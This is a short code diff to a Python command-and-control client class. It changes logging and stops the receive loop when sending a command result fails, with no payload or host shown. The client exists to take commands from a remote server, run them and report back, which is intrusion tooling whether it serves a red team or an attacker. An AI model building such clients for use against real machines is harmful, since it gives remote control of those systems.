@@ -136,7 +136,8 @@ class C2Client:
                 msg = await receive_message(self.reader)
                 
                 if not msg:
-                    # Connection closed or timeout
+                    # Connection closed
+                    logger.info("Server closed connection")
                     break
                 
                 if msg.type == "command":
@@ -204,11 +205,15 @@ class C2Client:
                 
                 # Send result back to server
                 if self.writer and not self.writer.is_closing():
-                    await send_message(
+                    success = await send_message(
                         self.writer,
                         Message.as_result(cmd_id, result, exec_time_ms)
                     )
-                    logger.info(f"Result sent ({exec_time_ms:.1f}ms)")
+                    if success:
+                        logger.info(f"Result sent ({exec_time_ms:.1f}ms)")
+                    else:
+                        logger.debug("Failed to send result - connection lost")
+                        break
                 
                 # Exit after sending kill result
                 if not self.running:
